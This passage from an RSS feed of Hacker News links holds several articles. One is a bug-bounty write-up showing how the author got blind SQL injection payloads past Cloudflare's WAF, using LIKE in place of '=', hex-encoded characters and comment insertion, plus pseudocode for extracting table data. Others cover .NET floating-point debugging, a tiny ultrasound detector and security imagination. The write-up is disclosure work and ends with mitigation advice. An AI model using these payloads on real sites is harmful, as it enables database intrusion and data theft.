    <p>First, I <a href="https://github.com/dotnet/runtime/blob/96f178d32b7ba62485917ac46ef1edcfd3c2d10d/src/coreclr/src/vm/cgensys.h#L157-L171">found calls</a> to the <code>_mm_setcsr()</code> x64 intrinsic, which set the value of <code>MXCSR</code>:</p>

    <div><div><pre><code>  <span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>m_mxcsr</span> <span>=</span> <span>_mm_getcsr</span><span>();</span>
      <span>_mm_setcsr</span><span>(</span><span>0x1f80</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>

  <span>~</span><span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>_mm_setcsr</span><span>(</span><span>m_mxcsr</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>
</code></pre></div>    </div>

    <p>This clearly shows that the runtime is aware of what a <code>MXCSR</code> is and it <em>does</em> try to restore the sane value of <code>0x1F80</code>, <em>sometimes</em>.
I didn’t follow up on when, because I figured it was <em>very</em> unlikely Microsoft engineers would overlook something of this magnitude, and it was probably something that we were doing, directly or indirectly.</p>
  </li>
  <li>
    <p>Secondly, I spotted <a href="https://github.com/dotnet/runtime/blob/56797842d45a0f55345842ab166618d0c153ec3c/src/coreclr/src/jit/utils.cpp#L2086-L2087">this comment</a>:</p>

    <div><div><pre><code><span>// Return Value:</span>
<span>//    True if 'x' is a power of two value and is not denormal (denormals may not be well-defined</span>
<span>//    on some platforms such as if the user modified the floating-point environment via a P/Invoke)</span>
</code></pre></div>    </div>

    <p>This rang several alarm bells immediately.
As a cross-platform .NET Core game with a bespoke framework, lazer has to make a <em>lot</em> of P/Invokes and native calling to <em>be</em> a game.
Combined with the fact that denormals/flush to zero are usually set by programs that …</p></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</a></em></p>]]>
            </description>
            <link>https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520728</guid>
            <pubDate>Fri, 18 Sep 2020 19:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I bypassed Cloudflare's SQL Injection filter]]>
            </title>
            <description>
<![CDATA[
Score 227 | Comments 98 (<a href="https://news.ycombinator.com/item?id=24520556">thread link</a>) | @gskourou
<br/>
September 18, 2020 | https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html | <a href="https://web.archive.org/web/*/https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Astrocamel</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-09-04">04 Sep 2020</time>
            
                on Web
            
        </span> -->

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare’s HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520556</guid>
            <pubDate>Fri, 18 Sep 2020 18:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The world’s smallest ultrasound detector]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24520424">thread link</a>) | @finphil
<br/>
September 18, 2020 | https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector | <a href="https://web.archive.org/web/*/https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="629622124808749056">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector"><h2>The world’s smallest ultrasound detector</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1080"><img src="https://64.media.tumblr.com/8b4391500528657ca313da58498378f4/d11322854d4824f5-52/s1280x1920/78d1a45475ad319acfc6092a66197792ab8c3c7f.png" alt="image" data-orig-width="1920" data-orig-height="1080" width="1280" height="720"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2F&amp;t=NGIzMzNmOGFlZDljOWZhY2UwZDYwYzgyZWJlMmM3NDMxY2ZjOTkyZCwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600705554">Helmholtz Zentrum München /&nbsp;German Research Center for Environmental Health</a> -</b></p><p>

Researchers at Helmholtz Zentrum München and the Technical University of Munich (TUM) have developed the world’s smallest ultrasound detector. It is based on miniaturized photonic circuits on top of a silicon chip. With a size 100 times smaller than an average human hair, the new detector can visualize features that are much smaller than previously possible, leading to what is known as super-resolution imaging.

<br></p><p>Since the development of medical ultrasound imaging in the 1950s, the core detection technology of ultrasound waves has primarily focused on using piezoelectric detectors, which convert the pressure from ultrasound waves into electric voltage. The imaging resolution achieved with ultrasound depends on the size of the piezoelectric detector employed. Reducing this size leads to higher resolution and can offer smaller, densely packed one or two dimensional ultrasound arrays with improved ability to discriminate features in the imaged tissue or material. However, further reducing the size of piezoelectric detectors impairs their sensitivity dramatically, making them unusable for practical application.</p><h2><b>Using computer chip technology to create an optical ultrasound detector</b></h2><p>Silicon photonics technology is widely used to miniaturize optical components and densely pack them on the small surface of a silicon chip. While silicon does not exhibit any piezoelectricity, its ability to confine light in dimensions smaller than the optical wavelength has already been widely exploited for the development of miniaturized photonic circuits.</p><p>Researchers at Helmholtz Zentrum München and TUM capitalized on the advantages of those miniaturized photonic circuits and built the world’s smallest ultrasound detector: the silicon waveguide-etalon detector, or SWED. Instead of recording voltage from piezoelectric crystals, SWED monitors changes in light intensity propagating through the miniaturized photonic circuits.</p><figure data-orig-width="1440" data-orig-height="1440"><img src="https://64.media.tumblr.com/881a91ad3ca89cc9468739054de1b5bd/d11322854d4824f5-5e/s1280x1920/bbc0cc85dfc9afaa3c093fd1f81b9c72941b3c01.jpg" alt="image" data-orig-width="1440" data-orig-height="1440" width="1280" height="1280"></figure><p><i>Image: Silicon chip (approx. 3 mm x 6 mm) with multiple detectors. The fine black engravings on the surface of the chip are the photonics circuits interconnecting the detectors (not visible with bare eyes). In the background a larger scale photonics circuit on a silicon wafer. Credit:&nbsp;

<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2Faktuelles%2Flatest-news%2Fpress-information-news%2Farticle%2F48828%2Findex.html&amp;t=MmQ3ODQxMzdjZjY3NTQ3NDU1YjgzNmRjZGM5ZDMwZTYwNTgzYmRjNSwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600705554">© Helmholtz Zentrum Muenchen / Roman Shnaiderman</a>.</i></p><p>“This is the first time that a detector smaller than the size of a blood cell is used to detect ultrasound using the silicon photonics technology”, says Rami Shnaiderman, developer of SWED. “If a piezoelectric detector was miniaturized to the scale of SWED, it would be 100 million times less sensitive.”</p><h2><b>Super-resolution imaging</b></h2><p>“The degree to which we were we able to miniaturize the new detector while retaining high sensitivity due to the use of silicon photonics was breathtaking”, says Prof. Vasilis Ntziachristos, lead of the research team. The SWED size is about half a micron (=0,0005 millimeters). This size corresponds to an area that is at least 10,000 times smaller than the smallest piezoelectric detectors employed in clinical imaging applications. The SWED &nbsp;is also up to 200 times smaller than the ultrasound wavelength employed, which means that it can be used to visualize features that are smaller than one micrometer, leading to what is called super-resolution imaging.</p><h2><b>Inexpensive and powerful</b></h2><p>As the technology capitalizes on the robustness and easy manufacturability of the silicon platform, large numbers of detectors can be produced at a small fraction of the cost of piezoelectric detectors, making mass production feasible. This is important for developing a number of different detection applications based on ultrasound waves. “We will continue to optimize every parameter of this technology – the sensitivity, the integration of SWED in large arrays, and its implementation in hand-held devices and endoscopes”, adds Shnaiderman.</p><h2><b>Future development and applications</b></h2><p>“The detector was originally developed to propel the performance of optoacoustic imaging, which is a major focus of our research at Helmholtz Zentrum München and TUM. However, we now foresee applications in a broader field of sensing and imaging”, says Ntziachristos.</p><p>While the researchers are primarily aiming for applications in clinical diagnostics and basic biomedical research, industrial applications may also benefit from the new technology. The increased imaging resolution may lead to studying ultra-fine details in tissues and materials. A first line of investigation involves super-resolution optoacoustic (photoacoustic) imaging of cells and micro-vasculature in tissues, but the SWED could be also used to study fundamental properties of ultrasonic waves and their interactions with matter on a scale that was not possible before.</p><h2><b>Collaboration and patenting</b></h2><p>The Institute of Biological and Medical Imaging at Helmholtz Zentrum München, the Chair of Biological Imaging at TUM, and TranslaTUM – the Central Institute for Translational Cancer Research at TUM’s university hospital Klinikum Rechts der Isar, have contributed equally to this new technology which was published in the journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41586-020-2685-y&amp;t=NDYxNGRiZmQ2MDBiN2E1MzBmOTBkMzQ2ZDIyODJjNjc3ZmRmMzk1MiwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600705554"><i>Nature</i></a>. Protection of the intellectual aspects of this technology is ongoing. </p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.helmholtz-muenchen.de%2Fen%2Faktuelles%2Flatest-news%2Fpress-information-news%2Farticle%2F48828%2Findex.html&amp;t=MmQ3ODQxMzdjZjY3NTQ3NDU1YjgzNmRjZGM5ZDMwZTYwNTgzYmRjNSwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600705554">Helmholtz Zentrum München / German Research Center for Environmental Health</a></b></p><p><b>Full study:</b>&nbsp;“A submicrometre silicon-on-insulator resonator for ultrasound detection”, <i>Nature</i>.</p><p><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1038%2Fs41586-020-2685-y&amp;t=ZTE5NDFhYmUxMWVjNzc1NDNlOGMzODg3YTNkNjMxZDc1ZTA0ZDgzMiwwYlNqdmdxUw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629622124808749056%2Fsmallest-ultrasound-detector&amp;m=0&amp;ts=1600705554">http://dx.doi.org/10.1038/s41586-020-2685-y</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/178125297442/new-wearable-ultrasound-patch-ucsd">New wearable ultrasound patch non-invasively monitors blood pressure in arteries</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/imaging">imaging</a>
                                    
                                        <a href="https://nuadox.com/tagged/ultrasound">ultrasound</a>
                                    
                                        <a href="https://nuadox.com/tagged/optics">optics</a>
                                    
                                        <a href="https://nuadox.com/tagged/physics">physics</a>
                                    
                                        <a href="https://nuadox.com/tagged/nanotechnology">nanotechnology</a>
                                    
                                        <a href="https://nuadox.com/tagged/featured">featured</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/629622124808749056/smallest-ultrasound-detector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520424</guid>
            <pubDate>Fri, 18 Sep 2020 18:42:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Imagination as a Security Tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520268">thread link</a>) | @wglb
<br/>
September 18, 2020 | https://ciexinc.com/blog/imagination/ | <a href="https://web.archive.org/web/*/https://ciexinc.com/blog/imagination/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      

<p>A tool you might not see mentioned often in security literature is imagination. It isn’t very
technical, and it isn’t very procedural, but failing to employ your imagination can often lead to
disaster.</p>

<h2 id="if-i-had-only-believed-i-could-win">If I had only believed I could win</h2>

<p>My favorite story is that of a young businessman who wrote about his early hobby of sailing.
He went up against the “big boys” in a race off Australia. During the middle of the race, he was
further out than the rest of the sailors and he thought he should go closer to their path, nearer
the shore.  Later he realized that if he had simply taken the water temperature with his
thermometer, he would have seen that he was on a faster path and finished much earlier. He notes “If
I had only believed that I could win, I would have.”</p>

<p>Also consider <em>“The Empire doesn’t consider a small, one-man fighter to be any threat.”</em> -— Rebel General Dodonna,
 shortly before a small, one-man fighter destroys the Death Star.</p>

<p>Some failures of imagination are more severe.  Do you remember one of our leaders standing in the
rubble of New York buildings saying “Who could have imagined this would happen.” Well, the
people who did it is who.</p>

<h2 id="defense-by-presumed-motive">Defense by presumed motive</h2>

<p>In talking to teams about how to build defenses, I often hear  “Well, if the attackers
get into one of my servers, the database is encrypted so they can’t get anything.”  There are
several problems with this thinking.  First, if attackers can get into a server, you probably need
to presume serious compromise. There is likely a way for them to find the keys that encrypt the
database.</p>

<p>From the standpoint of imagination, it presumes that attackers are after the one specific thing
that you are worried about–a very important asset.  What is likely valuable to the attacker is
control at any level of the server, not just the main jewels.</p>

<p>In doing <a href="https://gdpr-info.eu/">GDPR</a> review, it’s clear that most companies have significant
personally-identifiable information in places they may not realize, and further that this
information is shared with other entities in a way that isn’t tracked.</p>

<p>If this data is not on your list of key assets, it is easy to overlook that this might be a target.</p>

<p>It is likely true that there are other internal targets–large and small–that can be useful to
attackers. Discovery of those can be used as jumping off points for further “exploration”.</p>

<h2 id="what-could-possibly-go-wrong">What could possibly go wrong</h2>

<p>I have stickers that I like to share when I meet people or when someone leaves something
unlocked. It is usually met with humor, but the underlying message is serious: The “What Could
Possibly Go Wrong” mindset is a good one to have when thinking about the security of your software,
your AWS configuration, or your (unlocked) rack of building keys in the subbasement. I once
encountered an elevator control panel that swung open to reveal the internal wiring. I placed a
sticker there to help the repairman. A colleague left their wallet in a position highly visible from
the hallway, just inside the door. I carefully opened the wallet and placed sticker inside,
hopefully conveying the proper message.</p>

<p>While these stickers are usually seen as humorous, they illustrate an attitude that I think is
necessary as a defender of information assets. An unlocked terminal, which is often the target of
these stickers, can be an attacker’s gateway to the rest of the network or cloud resources.</p>

<p>This is useful to identify specific threats and can also be a useful message to people who are not
security-aware.</p>

<h2 id="diversity">Diversity</h2>

<p>I’ve worked for companies that make a serious effort in their hiring efforts–to recruit and hire
folks across many cultures, dispositions, genders, and backgrounds. But once hired, the internal
culture is essentially monolithic, with not much out-of-the-box thinking. Being all on the same page
is important to the mission of the company.  From a security perspective, any company with
information online (and who doesn’t conduct business in one form or another these days?) is facing
risks that are way out of the box. A recent widespread attack found thousands unprotected databases,
removed them, and replaced them with a string containing “meow”. No reason is given, and there is no
evident purpose. Who could have imagined.</p>

<h2 id="thinking-out-of-the-box">Thinking out of the box</h2>

<p>How do I increase my imagination, you might ask.</p>

<p>A twitter account <a href="https://twitter.com/badthingsdaily?lang=en">Bad Things Daily</a>, which isn’t
actually updated daily, has a litany of things to stimulate you imagination and keep you up at
night. These can be fodder for tabletop exercises. The latest scary one is “The company managing
your <a href="https://en.wikipedia.org/wiki/Mobile_device_management">MDM</a> has unenrolled your endpoint
agents and walked away. Managed <a href="https://en.wikipedia.org/wiki/FileVault">FileVault</a> keys are now
inaccessible.” Your endpoints are now no longer under your control.</p>

<h2 id="source-of-ideas">Source of ideas</h2>

<p>In addition to reading scary twitter feeds, a little time spent in reading ideas outside your
immediate responsibilities can feed your imagination. I’ve always felt that science fiction can
lead to a wider perspective.</p>

<h2 id="in-conclusion">In conclusion</h2>

<p>The systems that you are asked to defend are under attack, often from sources unknown, by methods
that may not be immediately evident. We need many tools, including logging, monitoring, red-teaming
our own infrastructure, but also imagination to be open to anticipating and recognizing attacks that
are unusual.</p>


    </div></div>]]>
            </description>
            <link>https://ciexinc.com/blog/imagination/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520268</guid>
            <pubDate>Fri, 18 Sep 2020 18:31:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of PNG Glitch]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24520201">thread link</a>) | @pmoriarty
<br/>
September 18, 2020 | https://ucnv.github.io/pnglitch/ | <a href="https://web.archive.org/web/*/https://ucnv.github.io/pnglitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a title="PNGlitch" href="https://github.com/ucnv/pnglitch/"><img src="https://ucnv.github.io/pnglitch/files/forkme.png" alt="PNGlitch"></a>
      
    </header>
    <section>
      <h2>Overview</h2>
      <p>
